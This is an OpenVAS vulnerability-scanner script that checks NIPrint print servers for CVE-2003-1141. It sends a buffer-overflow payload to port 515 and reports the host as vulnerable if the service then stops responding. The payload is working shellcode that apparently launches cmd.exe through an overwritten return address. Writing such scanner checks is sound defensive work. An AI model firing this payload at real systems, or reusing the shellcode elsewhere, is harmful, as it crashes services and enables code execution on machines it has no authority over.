# OpenVAS Vulnerability Test
# $Id: niprint_dos.nasl 12821 2018-12-18 12:37:20Z cfischer $
# Description: NIPrint LPD-LPR Print Server
#
# Authors:
# Matt North
#
# Copyright:
# Copyright (C) 2003 Matt North
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11926");
  script_version("$Revision: 12821 $");
  script_tag(name:"last_modification", value:"$Date: 2018-12-18 13:37:20 +0100 (Tue, 18 Dec 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2003-1141");
  script_bugtraq_id(8968);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("NIPrint LPD-LPR Print Server");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2003 Matt North");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(515);

  script_tag(name:"summary", value:"A vulnerability in the NIPrint could allow an attacker to remotely
  overflow an internal buffer which could allow code execution.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

port = 515;
if (! get_port_state(port)) exit(0);

soc = open_priv_sock_tcp(dport: port);
if(!soc) exit(0);

r = raw_string( 0x90,0xCC,0x90,0x90,0x90,0x90,0x8B,0xEC,0x55,0x8B,0xEC,0x33,0xFF,0x57,0x83,0xEC,0x04,0xC6,0x45,0xF8,0x63
,0xC6, 0x45, 0xF9, 0x6D,0xC6,0x45,0xFA,0x64,0xC6,0x45,0xFB,0x2E,0xC6,0x45,0xFC,0x65,0xC6,0x45,0xFD,0x78,
0xC6,0x45,0xFE,0x65,0xB8,0xC3,0xAF,0x01,0x78,0x50,0x8D,0x45,0xF8,0x50,0xFF,0x55,0xF4,0x5F);

r1 = raw_string( 0xCC, 0x83,0xC4,0x04, 0xFF,0xE4);
r2 = string(crap(43));
r3 = raw_string( 0xcb, 0x50, 0xf9, 0x77);
bo = r + r1 + r2 + r3;

send(socket:soc, data:bo);
close(soc);
alive = open_priv_sock_tcp(dport: port);
if (!alive) security_message(port: port);